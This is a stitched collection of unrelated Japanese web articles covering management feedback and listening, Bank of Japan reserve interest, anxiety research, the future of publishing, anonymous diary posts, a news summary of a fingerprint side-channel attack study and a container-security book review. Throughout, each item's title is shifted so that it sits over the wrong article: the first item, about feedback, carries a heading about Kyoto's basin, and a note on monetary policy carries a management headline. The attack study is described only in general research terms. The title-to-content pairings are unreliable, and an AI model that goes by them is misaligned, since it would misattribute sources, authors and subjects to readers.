Title: 京都盆地と奈良盆地は湖だったのか？　｜関西高低差大学

Link: https://logmi.jp/business/articles/330123
Content: マネジメントは、「聴く」だけでも「伝える」だけでも不十分 櫻井：このパートのアジェンダは3つぐらいに分けたいと思います。本を読んだ方は本の内容にプラスアルファで補足させていただく話になるかなと思います。 本を読んでいない方とか、手元にはあるけど「まだ積読だよ」という方もけっこういらっしゃると思うんですけど。そういう方にとっては初めての内容もあるかなと思いますが、1つ目のテーマである「フィードバック」について、まずはお話をさせていただきます。 2つ目は「聴く」ことについてお話ししようかなと思います。「フィードバック」というテーマで、「聴く」ことについてお話ししたいのは、やはりフィードバックする、「伝える」ことと「聴く」ことが、両立することで成り立っているというか。 マネジメントの現場では「聴く」だけでも「伝える」だけでもダメで、これをどうやって両立するかを考えた時に、「聴く」ことの定義が実はけっこう曖昧だなと思っています。「聴く」ことの定義をきちんとお伝えしておくことで、3つ目のパートの、「フィードバック」と「聴く」ことの両立についての話がきちんとできるかなと思います。 なので、いったんフィードバックについて話した後に「聴く」の定義をちゃんと整理をした上で、最後に3つ目の、「じゃあ『フィードバック』と『聴く』ってどうやって両立していくんだっけ」ということをお話ししていけたらなと思っています。 ご質問にもできるだけお答えしたいと思ったのですが、最初のチャットに書いていただいたものがかなりレベルが高く、多岐にわたった内容だったので。どこまでお答えできるかわかりませんが、僕がしゃべっている間に篠田さんがいろいろピックアップして、後半では良いパネルディスカッションができると思います。

フィードバックのよくある手法では、うまくいかないことも 櫻井：では1つ目のパートですね。「フィードバックとは」というのをけっこういろんなWebページを見て調べてきたんです。 というのも、多くの管理職の方が「フィードバック」とか「伝える」ということを考えた時に、ネット検索をすると思いまして。学術的にというよりは、一般的に管理職の方がどう認知しているのかが非常に大事なので、それを理解するためにちょっと見てきました。 多くのサイトをピックアップすると、目的は4つぐらいに絞られていました。人材育成、モチベーション・エンゲージメントの向上、業務能力の向上、組織の目標達成。このあたりに絞られていて、あまり違和感はないかなと思います。 けっこう印象的だったのが、「行動・結果についてフィードバックしましょう」と明確に多くのサイトで書かれていたんですね。「それ以外のところは扱わないほうが逆に良い」と書いてあるサイトもあったぐらいです。 あと、フィードバックの種類にはポジティブなフィードバックとネガティブなフィードバックがあって、どちらも使い分ける必要がありますよね。これらをどう使い分けるかと言うと、最初にポジティブなことを言って、途中でネガティブなことを言って、最後にポジティブでまとめるといいよね、みたいなことがよく言われます。 「ネガティブの割合が2割ぐらいがいいよね」とか「3割ぐらいがいいよね」と書かれていたり。あとはSBI型とかペンドルトン型というのは私も初めて聞いたんですけど、いろんな手法があって、「フィードバックはこういうフレームでやるといいよ」ということが書かれていたんですね。 今日私が扱いたいのはここの2つで、「行動とか結果だけのフィードバックでいいんだっけ」という話です。近年これだけ「多様な人を扱いましょう」と言っている時に、フィードバックが行動とか結果だけでいいのか、ちょっと気になりました。 もう1個は、最初にポジティブに承認した後に、「ここを直したほうがいいよ」「がんばろうね」みたいなことをポジティブに伝える。確かにこういった手法はみんな試していると思うんですよね。 「すでに試しているんだけど、うまくいかないから困っているんだけどな」というのが、フィードバックというテーマでみなさんが来ていただいている理由だったりすると思います。なのでこのへんを扱えるといいのかなと。

フィードバックをする基準は「他者への貢献度」の高さ 櫻井：ポジティブフィードバック、ネガティブフィードバックって書かれていますが、ネガティブという表現よりギャップという言葉のほうが私は心地よかったので。本の中では「ポジティブフィードバック」と「ギャップフィードバック」という言葉を使いました。 ポジティブフィードバックが何について言われているかと言うと、他者にどれだけ貢献しているか。逆に貢献度が低いものに関しては、ネガティブフィードバックが行われているんだろうなと思っていました。 最近フィードバックについて書かれた本で、すごくうまくまとまっている本があるなと思ったんですけど。これに私なりの「事象の発生頻度」というものを入れると、けっこうフィードバックへの解像度が上がるかなと思い、この横軸に入れさせてもらったんですね。 「フィードバックマトリックス」という名前をつけて、本には出させてもらいました。ここのゾーンに1・2・3・4と名前をつけて、それぞれの領域に対して「どういうコミュニケーションやフィードバックをしていくといいんだっけ」ということを書かせてもらいました。 もう釈迦に説法というか、管理職研修で耳タコなぐらい言われている「ちゃんと褒めましょうね」「感謝を伝えましょうね」とかの話は、このゾーン1の貢献度が高いものについての話だと思うんですよね。 「良い仕事に対しては言葉にして感謝を伝えましょう」という話をしているんですけど、基本的には、発生頻度が高いものが選ばれがちだと思うんです。「いつもこういう良い仕事をしてくれている」ということに対して「ありがとう」とか「よくやっているね」という声掛けがされていると思うんです。 こんなことは本当に釈迦に説法だと思うので、もう言う必要がないぐらいだと思うんですけど、ここでのポイントは「きちんと言葉にしましょう」という話ですね。

フラットな関係性を作る「貢献を伝える」コミュニケーション 櫻井：最近で言うと、唯一「このへんだけ気にしたほうがいいかな」と私自身が思っているのは、褒めることと、感謝を伝えるとか貢献を伝えることは、概念としてはけっこう違う話だなと思っています。 子どもに「偉いね」という言葉を使われたりすると思うのですが、あれってやはり上下関係が前提ですよね。「よくがんばったね」とか「よくやったね」というのは承認力が非常に強い一方で、依存関係が生まれる可能性があるというか。 上司に褒められるために仕事をするということが生まれる可能性があるなと思いました。あと最近ですと、IT業界とかに行ったら、部下のほうがツールに詳しかったりして、優秀だったりすることがあるじゃないですか。 なので「褒める」だけだと上下関係を前提にしていないコミュニケーションをしようとした時に、なかなかうまく使えないことがあるんじゃないかなと。その時に右側の「感謝を伝える」はみなさん意識していると思うんですけど、「貢献を伝える」というフィードバックの仕方があると、すごくコミュニケーションしやすくなります。これは管理職の方によく伝えさせていただいています。 「感謝を伝える」はわかりやすくて、「ありがとう」ですよね。「貢献を伝える」っていうのは、「すごく助かったよ」とか「すごくうれしいよ」とか、自分自身が「うれしい」「安心した」ということですね。このコミュニケーションを持っていると、けっこう良いフィードバックになったりします。 これは横の関係なので、上下の関係じゃなくても使える言葉なんですよね。上司が部下に対して使えるのはもちろんなんですけど、部下の方が上司に対しても使える言葉がこの「感謝」とか「貢献を伝える」ということだと思っています。 なので、フラットな関係を維持しやすいです。逆に言うとデメリットもあって、やはり承認力は弱いですね。 「すごいよね」「偉いね」「よくがんばったね」と言われるよりは承認力が弱いので、承認をしてモチベーション上げたい時には左側を使ってもいいのかなと思いますが、ここは明確に使い分ける意識があると、効果が出やすいかなと思います。
Title: 部下への注意の仕方は4種類に分けられる　管理職を悩ませる、現状と理想のギャップの伝え方

Link: https://note.com/hattori0819/n/n5905509707b2
Content: 今月に入ってから、利上げに伴う三層構造がどうなるか、ということが話題になり始めた気がします。特に、内田副総裁の講演において下記のように言及されたことがあります。

「仮に」とはいえ、マイナス金利導入前に戻すという言及があったことから、マクロ加算残高を含む二層構造ではなくて、YCCの前（一層構造）に戻るのではという議論が活発になされている印象です。ちなみに、以前議論されていた二層構造については下記の記事などを参照してください。

アングル：マイナス金利、撤廃なら当預は2層か 短期市場への影響不透明 | ロイター (reuters.com)

そこで、今回は、そもそも付利が付されるようになった「当座預金付利金利制度」導入の背景を整理しておきます。

経緯としては、2008年の金融危機時に景気が悪化し、日銀が利下げの必要性に迫られました。当時は、かつてのゼロ金利政策や量的緩和政策と同様、ゼロ金利という政策もあったところ、2008年10月31日の利下げのタイミングで、0.1%の付利を支払う「当座預金付利制度」（補完当座預金制度）が導入されました。

その経緯については、やはり基本書ということで白川さんの書籍（「中央銀行」）をソースに整理します（ここでは白川さんの書籍に記載されている当座預金付利制度という表現を使います）。

まず、白川本では、付利制度の目的を下記のように整理しています。

金融機関は法律に定められた金額（所要準備額）までは日本銀行当座預金残高を保有するが、それを超えて当座預金を保有しても金利収入は得られないので、余剰資金をインターバンク金融市場に放出し他の金融機関に資金を貸し付ける。その結果、短期金利の水準はゼロにまで低下することになる。ここで問題となるのは、金融システム安定維持の観点から潤沢な資金供給を行った結果実現する金利水準は、必ずしもマクロ経済の安定の観点から最適な金利水準と一致する保証はないことである。そこで当座預金付利制度が登場したのである。当座預金に対して付利を行うことが認められれば、日本銀行は金融システム不安に対処して流動性を潤沢に供給する一方で、マクロ経済情勢を踏まえた金利水準を金融政策の必要性に基づいて設定することが可能になる（p.250）。 白川方明「中央銀行」

白川本では、付利制度が入った背景に、米国で同じ制度が導入されたことも指摘しています。米国の制度は2006年に導入決定、2011年に実施となりますが、これについては私が記載した「フェデラル・ファンド（FF）市場 およびFFレート（FF金利）入門」でかなり細かく説明しているので、関心がある方は下記のリンクを参照してください。

202205d.pdf (mof.go.jp)

白川本では、当座預金付利制度が必要であった理由を二つ言及しています。

導入が必要と判断した理由は２つあった。一つは2001年3月～06年3月の量的緩和政策時の経験から、マクロ経済の安定のために最適な短期金利水準は文字どおりのゼロではなく、若干のプラス水準であると判断していたことによる。つまり、下限金利が存在するのである。当時、オーバーナイト金利は0.001%という極端的なゼロ金利水準となったため、取引コストを勘案した場合、インターバンク市場の機能が低下するというも問題が発生した。このため、金融機関が必要なときに必要な額の資金を市場で調達できるという安心感がなくなるという副作用も生じた。言い換えると、短期金利がある閾値を超えて低下すると、金融政策の景気刺激効果がプラスからマイナスに転嫁する可能性があるということである（p.251）。 白川方明「中央銀行」

この点はよく指摘される点で、当座預金付利制度はインターバンクの流動性等に配慮された政策だという整理がなされます。マイナス金利政策が実施される中で、三層構造を導入されることで、インターバンクの流動性が向上したとされます。この状態から、YCCの前に戻してもよいという判断の背後には、当座預金付利制度が維持されれば一定の流動性が維持されるという判断があると推測されます。内田副総裁の講演では「マイナス金利の導入前には、日本銀行の当座預金取引先の超過準備に0.1％の金利を付利し、取引先でない金融機関との裁定取引が行われる結果」というメカニズムが指摘されていました。

白川本を読んで面白かったのは、対外的に説明されない第二の理由について言及があった点です。ここは少し長いですが、興味深いので引用しておきます。

私が当座預金付利制度を導入する必要があると判断したもうひとつの重要な理由は、当時対外的には言及しなかったが、将来必ず出来する「出口戦略」に関連していた。2006年の量的緩和からの「出口戦略」の際は、満期が到来した資金供給オペレーションを継続しないことによって量の圧縮を図ったうえで、政策金利の引き上げを行った（第５章「ゼロ金利政策と量的緩和政策」参照）。この時は、オペレーションの満期が相対的に短く、したがって量の圧縮も約4か月と比較的短期間で終わったが、当座預金残高が大きく増加したりオペレーションの満期が長期化した場合には、量の圧縮に相当の期間を要することになり、金利引き上げを機動的に行うことが難しくなる可能性がある。もちろん、「出口」が近くなった段階で、当座預金付利制度を創設するという選択肢も考えるが、議論を始めた段階でさまざまな憶測を呼び金融市場は混乱するおそれが大きい。そのような事態を想定すると、短期金利を先行的に引き上げるという選択肢を持っておくことが必要であり、それを可能にするのが当座預金付利制度であった。実際、2015年12月以降、FRBは膨大な当座預金が存在する中で政策金利の引き上げを行っているが、本制度がなければこれは不可能であった（p.253)。 白川方明「中央銀行」

今回は白川本をベースに、当座預金付利制度を導入意図を整理しました。最後の部分は少し長めに引用しましたが、全体的には省略した部分も多いため、同書の８章を通読することを強くお勧めしたいと思います。今回はここまでにしますが必要に応じて加筆修正します。
Title: 当座預金付利制度（補完当座預金制度）についてのメモ｜服部孝洋（東京大学）

Link: https://nazology.net/archives/145488
Content: 謎の不安感は脳のどこで生じているのか？

ヒトも動物も常に身のまわりの環境に気を配り、潜在的な危険がないかどうかを意識せずともチェックしています。

その中でときに、説明はできないけれど何となく居心地が悪く、嫌な予感がすることがあるでしょう。

この感覚は例えば、目の前に殺人鬼や捕食者など、はっきりした脅威の対象が存在しないので「恐怖」ではありません。

得体の知れないものに漠然とした恐れを抱くゆえに、これは「不安」といえます。

不安を感じること自体は、潜在的な危険を察知している証拠なので、生存には有益といえるでしょう。

しかし不安が過剰になると、適切な判断力を失い、周囲の変化についていけず、適応障害を引き起こす恐れがあります。

そのため、不安感が生じる仕組みを解明することは重要な課題なのです。

そこで研究チームは、こうした謎の不安感が生じる脳領域を探すことにしました。

チームは、不安感をコントロールしているのは「手綱核（たづなかく）」という脳領域ではないかと考えました。

手綱核は、海馬の下側に位置する一対の小さな神経核で、ほぼすべての脊椎動物に見られる古い脳構造です。

意欲や認知機能において重要な役割を担っており、手綱核が異常を起こすと、うつ病や不安障害につながると考えられています。

また今回の研究では、手綱核の中の「アストロサイト」という脳細胞に焦点を当てました。

脳は一般にニューロン（神経細胞）とグリア細胞という2つの細胞によって構成されており、そのグリア細胞の一種をアストロサイトといいます。

アストロサイトは脳内の情報処理や神経伝達物質の濃度調節に関与しているため、チームは不安感の制御にも関わっているのではないかと予想。

マウスを実験台として、手綱核のアストロサイトが不安感を左右するかどうかを検証しました。
Title: 「漠然とした不安」が生じる脳領域を特定！人為的操作で不安を打ち消すことにも成功 - ナゾロジー

Link: https://logmi.jp/business/articles/330125
Content: 1on1に唯一無二の正解はない 櫻井将氏（以下、櫻井）：最後に、じゃあ「フィードバック」と「聴く」ことをどうやって両立するんだっけ、ということを話します。「フィードバック」だけでも「聴く」だけでもダメだと思うので、ここの両立について。 私も「聴く」ことや1on1について散々伝えているので、「1on1の正解を教えてください」とよく言われるんですけど、最初にお断りしておくと、これにはちょっと答えられないなと。 やはり関係性や相手の状態によっても違うし、自分側のスキルや得意や好きなものによっても異なるので、唯一無二の正解はないなと思っていて。ただ「こんな感じでやったらうまくいくよ」という定石のようなものはあると思うんです。 料理でもそうなんですけど、「肉じゃがの正解を教えてください」って言われても、唯一無二の正解はたぶんないと思うんです。ただ、「こうやったらだいたいうまくいくよ」みたいなものがあって、「そこからはあなたがアレンジしてください」という話だと思うので。そういったものを今日はお伝えできればなとという感じです。

「聴く」と「伝える」の両立はどうするか 櫻井：「個人として何ができるか」と「組織として何ができるか」という2つでお話ししようと思います。個人としてできることは、「聴く」と「伝える」の両立ですね。どうやってこのバランスをとるかということで、私の話で一番「なるほど」と言っていただけるものを1つ、お伝えします。 Positive Intention Matrixというものを作らせてもらったんですけど、要は1on1もふだんの会話もそうです。今話している会話がどこの領域の話をしているかによって、それを「伝えたほうがいいのか」「聴くほうがいいのか」を分類したものになっています。 まず軸の説明からするんですけど、縦軸は、下のものが上のものに影響を与えるという軸になっています。逆に言うと、上のものが下のものに影響を受けるということですね。なので例えば、最近太りすぎてダイエットをしたいと思ったから、今ランニングをしていますと。 要は「ダイエットをしたい」と思考したので、「ランニングをする」という行動をしています。「お客さんにとってこれがいいと思ったので、こういう提案書を作りました」というふうに、思考が行動を作っていきます。 自分がうれしいとか楽しいとか、悲しいという感情が思考を作り出していきますし、自分の価値観やバイアス、信念、思い込みみたいなものが自分の感情を作り出します。 例えば阪神ファンで「阪神が好き」という価値観を持っている方であれば、阪神が日本一になったら「うれしい」となりますし、根っからの巨人ファンで「巨人が好き」という価値観を持っていたら、阪神が日本一になったら、「むかつく」「悔しい」って思うわけですよ。 まったく同じ事実に対しても、人の価値観によって生まれる感情・思考が異なるので、行動が変わってくるということです。なので下のものが上に影響を与えるということです。

ビジネスにおいては「聴く」だけでは効率が悪い 櫻井：横軸は、「人生がキャリアに影響を与える」「キャリアは役職に影響を与える」「役職はタスクに影響を与える」と、左のものが右のものに影響を与えるという順番で並んでいます。 人生で大切にしているものがあるからキャリアのチョイスをしますし、マネージャーになるのか、専門職になるのかを選んだりします。やはり部長とメンバーでは同じ事象に対峙した時にアクションや考え方が変わりますよね。 部長としての判断と、メンバーとしての判断は変わりますし、同じ事象でも、会社の部長として判断するのか、1人の子どものお父さんとして判断するのか、お母さんとして判断するのかは、ぜんぜん違う意思決定が起きる可能性があります。 なので、「役職が目の前のことに対して影響を与えることがある」という意味で、左のものが右のものに影響を与えるというように並んでいます。 例外はもちろんあるんですけど、先ほど言ったwith Judgementとwithout Judgement、「聞く」と「聴く」ということ、「伝える」ということも、こんな役割分担でできるといいんじゃないかなというのがこの表になっています。 よく傾聴の研修なんかをすると、「とにかく聴きなさい」と言われるんですけど、仕事の行動レベルの話はジャッジメントなく聞いていると、ものすごくスピードが遅くなりますし、効率が悪いと思うんですよ。 だって知識や経験があって、（正しい）判断はわかっているわけなので、「これはこうやったほうがいいよ」と伝えたほうがいいと思いますし。「それは間違っている」ということだって、ちゃんと伝えるほうがいいと思うんですよね。 この時に怖がってジャッジせずに、「いや、それも正しいのかもしれないな」とかやっていると遅くなったりするので、右上はジャッジメントをしてもいいことが多い領域だと思います。一方で、左下はジャッジメントなく聴けるといい領域かなと思っていて、その人の価値観ですよね。 「私はこういうことを大切にしています」と言った時に「いや、それは違うと思います」と言われたらけっこう困るというか、人間性を否定されたなと感じると思うんですよね。 一番最初のスライドにあった「行動とか結果に対してフィードバックをしましょう」っていうのはたぶんそこの話で、行動や結果のレベルに対してフィードバックをかけていくものですよ、というお話をしていたのかなと思います。

かつては上司がちゃんと聴かなくても、組織が成り立っていた 櫻井：これが難しくなってきている理由は、日本企業のほとんど、特に大企業は終身雇用・年功序列という仕組みで昔は成り立っていたんですよね。 「自分の人生やキャリアの価値観は、この会社にいれば満たされる」というのが前提だったと思うんです。なので20〜30年前ぐらいまでは、上司がちゃんと聴かなくても、終身雇用や年功序列という仕組みがこの左下の（個人のハード面・ソフト面）を満たしてくれている状態だったと思うんですね。 すると、ここが満たされているので、多少右上のところできつい言葉や理不尽な言葉を言われたとしても、「まぁでも、歯を食いしばって言うことを聞いていれば自分の人生は安泰だ」と。この前提で成り立っていたので、厳しく言っても関係が崩れなかったり、ハラスメントにならなかったと思うんです。 これにはソフト面も影響していて、もっと飲み会やランチが多かったし、喫煙所で「いや実はさ」みたいな話をしたりしたと思うんです。ソフト面・ハード面でやはり左下が担保されていたんだと思うんですけど、今は終身雇用が崩れていますよね。 今みなさんの会社にいる25歳以下の方とかに聞いてもらえばわかると思いますけど、たぶん60歳までその会社にいようと思っている人って本当にほぼわずかだと思っています。 なので左下がものすごく多様化していますし、自分の中でもフワッとしている状態で厳しいことを言われたら、それはハラスメントというか、「もうここにいたくないです」となっていくと思うんです。なので厳しくフィードバックをきちんと伝えるためにも、左下側ですね。 「相手が今何を感じているのか」「何を大切にしているのか」を意図的にコミュニケーションを取って聴いていくことができると、厳しく言ったとしても「あっ、自分のことを思って言ってくれているんだな」となるので。1on1でこういう話をしましょうと言っているのは、心理的安全性が高まるからだろうなと思うんですけど。 この左下の領域において、終身雇用・年功序列というハード面の制度を除いて、できるだけ聴くということを組織として担保していかないと、仕事がうまく進まないということを言っているのかなと思います。
Title: ハラスメントにならない、部下への厳しいフィードバックの伝え方　心理的安全性を高める「聴く」と「伝える」の使い分け　

Link: https://togetter.com/li/2316648
Content: 気をつけたいポイント

優しさにもいろんな種類がある

優しくない時にどんな人かを見る
Title: 「人は誰でも優しい部分を持ってるから、優しさだけを見て人を好きになっちゃいけないよ」掃除のおばちゃんが休憩中に言った一言に共感の声

Link: https://realsound.jp/book/2024/02/post-1575188.html
Content: ■紙の雑誌は低調だが電子書籍は好調

2000年～2010年頃、出版物の部数や売上がどんどん落ち込み、出版不況という言葉が盛んに使われるようになった。しかし、現在の出版界はといえば、電子書籍の普及や漫画や小説のメディアミックスが好調であるため、盛り上がりを見せている。特に漫画を出版している出版社は堅調であり、異業種からも漫画に参入する動きがあるくらいである。

出版文化研究所の調査によれば、2019年まで下降していた出版物の推定販売金額は、2020年からじわじわと上昇し、2022年には1兆6305億円の規模になっている。特に電子書籍の伸びは大きく、2014年にはわずか1144億円だった市場が、2021年には4662億円まで拡大。2022年には5013億円となった。

しかし、紙媒体の落ち込みは深刻なレベルである。2010年代からいわゆる専門誌の休刊が相次いでいるが、今後は週刊誌、月刊誌までもが淘汰されるのではないかと予測されている。誌名を挙げることは控えておくが、誰もが知るレベルの雑誌も危機的な状況で、休刊待ったなしの状況にあると言われる。

■電子書籍が出版界の主流に

漫画は単行本では数百万部、数千万部のヒットが出ている。特にメディアミックスの効果で、『鬼滅の刃』も『【推しの子】』も、アニメ放送後に爆発的な部数の伸びを示した。その一方で雑誌の部数は寂しい状態で、「週刊少年ジャンプ」ですら100万部を割り込むのは時間の問題と考えられる。

では、10年後、出版界はどのようになっているのだろうか。そして、どんな出版物が注目を集めるようになっているのだろうか。予測してみよう。まずは漫画だが、現役の出版社の編集者はこう予測する。

「WEBTOONからメディアミックス化されるヒットが出て、盛り上がっているのは容易に想像がつきますが、従来のような読み方の漫画もしっかりと支持されていると思われます。ただし、紙で単行本を買う文化は衰退し、電子書籍が主流になっているでしょう。特に、10代の若者が電子書籍で漫画を読むことに慣れており、彼らが社会人になった10年後には電子のシェアは紙に大差をつけていると思います」

■所有欲を満たす紙の本が増える

では、紙媒体の本はどうなっていくのか。前出の編集者は、「紙の需要も一定数残っていくと考えている」と話す。そうした紙の本とはずばり、紙の質や製本にもこだわった特別な本である。

「書籍の“グッズ化”が進むと考えられます。今でも、熱心なファンをもつ作品の限定版や特装版は多く出ていますが、その傾向が加速するのでは。やはり、ファンは好きな作品は紙で所有したいでしょうし、本棚に並べて飾りたいもの。漫画や画集などの分野では、ネットで注文を受け付ける受注生産式の書籍は増えていくと思います」

本のプレミアム化とでも言えばいいのだろうか。万人に売れる必要がない趣味性の高い本は、豪華な仕様になって残ると思われる。こうした傾向から、いわゆる自伝などの自費出版も堅実な需要を維持するかもしれない。やはり紙がもつ保存性や、装丁にこだわる特別感は、電子書籍では満たされないものがあるためだ。10年後は紙と電子のすみ分けが現在以上に進んでいるのは間違いなさそうである。
Title: 出版社の未来、10年後はどうなっている？　 電子書籍主流、紙は趣味的な分野で残る？　識者の見解から考察

Link: https://togetter.com/li/2316620
Content: 接遇のポイント、話させないほうがよかったのでは…

でも接客する上で大事なのはこういう精神なのかもしれない
Title: 接遇が素晴らしく模範となる受付嬢がおり、それを表彰し彼女が気をつけている接遇のポイントをみんなに話させた結果こうなった

Link: https://anond.hatelabo.jp/20240217232512
Content: 大手建築会社とかトラップ用内装会社とか器具備品の納入業者とか

モンスター養殖会社とかワルモノ派遣会社とか

そういうところに、いちいち見積もりとってやるのも

極秘でバレないようにやらなきゃいけないのかと思ったけど

大手コンサルタントが営業かけてきた。

あんなコンサル通してるから、どこかで情報が漏れたり

罠やなんかも汎用品の使い回しで安価になってたりして

結局攻略されちゃうんだろうな。

予算さえあればお任せしたいところではあるんだけど。

古式ゆかしいダンジョンのほうが謎解きとか難しいと感じるのは

自力でチミチミ作ったせいなんだろうな。

新しめのダンジョンって結構テンプレートな攻略法な気がする。

理想のダンジョン作るなら、地道に洞窟探して

そこにコツコツ穴を掘ってくしかないのかなぁ。

まずは良い物件探しだよね。

ツイートシェア
Title: ダンジョンの発注

Link: https://anond.hatelabo.jp/20240215011314
Content: ■ 非モテ男だけど英検と数学とジムに救われている

恋愛したくなったり、風俗に行きたくなったり、過去何度も敗退したマッチングアプリに登録してみたくなったりする

3年前くらいにここでこういう苦しみを吐露した時に「物理と筋トレをしろ」と言われた

それ以来、異性への関心や渇望が湧いたら運動するか勉強することにしている

運動は市立体育館のジムをビジター利用

常にいるアルバイトのマッチョなお兄さんに教えてもらって筋トレするか、ランニングマシンで走る

勉強は英検か数学

英語歴は中学の英検、高校の大学受験、大学時代のTOEICくらいだったが、コツコツと勉強し続けたことによって英語検定一級を取得した

数学は大学受験（文系）のセンターと個別で利用した数学1A2Bまでで大学に入ってからは頭から吹っ飛んでいた

中学数学から始め、基礎問題精講や青チャートを使って記憶を辿り、数3にも手を出し、高校数学が終わった現在は解析、線形代数、確率の入門書を一冊ずつ購入してそれをペラペラと読んでいる

ラーメン、酒、タバコ、ポルノ、自慰、風俗に頼らなくても異性への関心を昇華できるようになったのは人間としての大きな成長だと感じている

ツイートシェア
Title: 非モテ男だけど英検と数学とジムに救われている

Link: https://togetter.com/li/2317244
Content: 承認欲求の強い年代にはこういうのが流行るのかなぁ…と思ったり

リンク CNET Japan 「投げリアル」が流行中--Z世代に人気のSNS「BeReal」とは 「加工できない」「投稿時刻はアプリが決める」「自撮りと周囲を必ず写す」――そんな制限だらけのSNSがZ世代を熱くさせている。フランス発のSNS「BeReal」（ビーリアル）だ。 20 users

このアプリ、中高生の間で流行っているらしい
Title: 中高生の間で流行っているらしいアプリ『Be Real』は、使い方をしっかり話し合っておかないとトラブルに巻き込まれそうなので注意

Link: https://www.itmedia.co.jp/news/articles/2402/19/news041.html
Content: 中国の華中科技大学などに所属する研究者らが発表した論文「PrintListener: Uncovering the Vulnerability of Fingerprint Authentication via the Finger Friction Sound」は、スマートフォンによる指紋認証時の摩擦音を録音し解析することで、その指紋を復元する自動指紋識別システム（AFIS）へのサイドチャネル攻撃を提案した研究報告である。

PrintListenerの攻撃シナリオ

この攻撃手法は、ユーザーの画面上でのスワイプ動作を利用して指紋の特徴を抽出し、これらの特徴に基づいて、ユーザーの指紋に対する辞書攻撃を行うものである。

PrintListenerは、動的な話し声や背景ノイズの干渉に隠れた微弱な摩擦音を分離し、予測モデルを通じて指紋の第一特徴（指紋パターン）を得る。さらに、推測できた第一特徴に対応する指紋の第二特徴（細部の位置と方向）をアルゴリズムを用いて合成。合成した指紋細部テンプレートは、指紋認証の基礎となり、指紋画像の再構築に使われる。

摩擦音波の伝搬経路

PrintListenerのワークフロー

この攻撃は、スワイプによる摩擦音を攻撃の自然な入口として使うことで、隠密性と普遍性の2つの利点を持つ。

隠密性の面では、追加のハードウェアを必要とせず、デバイスの内蔵マイクを利用して、指の動きから生まれる微弱な摩擦音を捕捉する。普遍性の面では、特定の人物に関する大規模なデータトレーニングを必要とせず、特定のパターンに合致する全ての被害者の指紋に対してより強力な辞書攻撃が可能だ。

実世界のシナリオでの広範囲にわたる実験結果は、PrintListenerが最高セキュリティの誤受入率（FAR）設定0.01％で、5回の試行内に最大26.5％の部分指紋と9.3％の完全指紋を攻撃できることを示している。

Source and Image Credits: Man Zhou, Shuao Su, Qian Wang, Qi Li, Yuting Zhou, Xiaojing Ma and Zhengxiong Li. PrintListener: Uncovering the Vulnerability of Fingerprint Authentication via the Finger Friction Sound
Title: スマホ指紋認証の“摩擦音”を録音→指紋を復元する攻撃　中国の研究者らが開発

Link: https://anond.hatelabo.jp/20240219144213
Content: 娘は学校も勉強も嫌いで素行も悪く（布団にもぐってYoutubeを見たりこっそりお菓子を買って隠れて食べるなど）、絵を描くことだけは集中して努力できるというタイプだった

なかなか上手く描けないと言って試行錯誤しているのを微笑ましく見ていたものだが、先日その娘がAIイラストを生成しているのを見つけてしまった

描かれていたのはリアルな画風のゆっくり魔理沙だった

「パパこれすごいよ！ 自分で描かなくても超上手い絵ができるんだよ！」

娘は嬉しそうというか、興奮気味にそう言ってどんなプロンプトで生成したのか教えてくれた

拙い操作でYoutubeや検索エンジンを検索し、連日こっそり深夜までネットサーフィンを続けて（これは叱った）自力でプロンプトを身に着けたらしい

英単語の意味は知らなくても生成はできるのだ

いやすごい、それはそれですごいよ

でもね……ゆっくり魔理沙くらいは自分で描いてほしい、パパはそう思ったよ

ツイートシェア
Title: 小4の娘がAIイラスト生成してた…

Link: https://dev.classmethod.jp/articles/review-book-with-container-security/
Content: コーヒーが好きな emi です。

コンテナを使ったアーキテクチャは引き合いも多く、私も常々しっかり学ばねばならないと思っていました。そんな折、以下のイベントでコンテナセキュリティに関する内容で登壇をすることになりました。

コンテナセキュリティについて学ぶため「コンテナセキュリティ コンテナ化されたアプリケーションを保護する要素技術」を読みましたので、本記事では本書の概要と感想を記載します。

書籍情報

書籍タイトル : コンテナセキュリティ コンテナ化されたアプリケーションを保護する要素技術

著者 : Liz Rice（著）、株式会社スリーシェイク（監修）、水元 恭平、生賀 一輝、戸澤 涼、元内 柊也（訳）

出版社 : インプレス

出版日 : 2023/4/12

本書は、Liz Rice『Container Security: Fundamental Technology Concepts that Protect Containerized Applications』O'Reilly Media, Inc.の翻訳書です。本書は、開発者、運用者、セキュリティ専門家がセキュリティリスクを評価し、適切なソリューションを決定するために、コンテナの主要な要素技術を検証する実践的な書籍です。

B5 版の小ぶりな書籍です。



全部で 279 ページあり、厚みはこんな感じです。ビジネスバッグに入れて通勤時間に読むのにちょうどいい大きさ・分量かなと思います。



私は通勤や休み時間などの隙間時間で少しずつ、あとは休日に実際のコマンドを実行しながら読む、というのをやって大体 1 週間くらいかけて読みました。

私は隙間時間に技術書を読もうとすると前後の業務との切り替えが難しかったり目が滑ってしまって内容が入ってこなかったりするので、ペンで線を引いたりページを折ったりしながら受験生の参考書ように読んでいます。

書籍の感想

「コンテナセキュリティ」というタイトルの本ですが、セキュリティに限定せず、「コンテナとは何か」から詳細に説明しています。 設計書やパラメーター設計の際にここまで詳細なことは書かないであろう根本的な考え方や技術が記載されています。コンテナの本質的な理解に基づき、その特性を踏まえた上で、セキュリティの面からどのような対策が必要かを解説している内容です。

前半（Chapter 1～5）

コンテナは「カーネルの機能を使って分離されたプロセスである」ということが丁寧に解説されています。Linux カーネルの機能を実験するコマンドがいくつも記載されており、これらの機能でセキュリティ境界を分離したものがコンテナなのだな、というのがじわじわと分かってきます。

後半（Chapter 6～13）

コンテナを使ったアーキテクチャを設計・構築・運用している方ならよく実装されるであろう CI/CD パイプラインやイメージスキャン等について触れられます。また、シークレットの扱いやネットワークの暗号化等、コンテナに限らず一般的に考慮すべき事項についても解説されています。

章ごとの概要と感想

Chapter 1 コンテナセキュリティの脅威

昨今のコンテナ流行とコンテナ脅威モデルなどを解説しています。セキュリティ境界やセキュリティ原則にも触れ、セキュリティに関する前提事項をまとめています。

Chapter 2 Linuxシステムコール、パーミッション、capability

コンテナは Linux OS を実行しているコンピューターで起動されることが多いです。この章では Linux の基本的な機能を説明しています。Linux が得意な方はサッと読み飛ばしてもいいかもしれません。

Chapter 3 コントロールグループ

コンテナを作るための基本的な構成要素の一つであるコントロールグループ（control group、cgroup ）について詳細に解説しています。cgroup を適切に設定することで、特定のプロセスが CPU やメモリなどのリソースを独占して他のプロセスの動作に影響を与えるのを防ぐことができます。

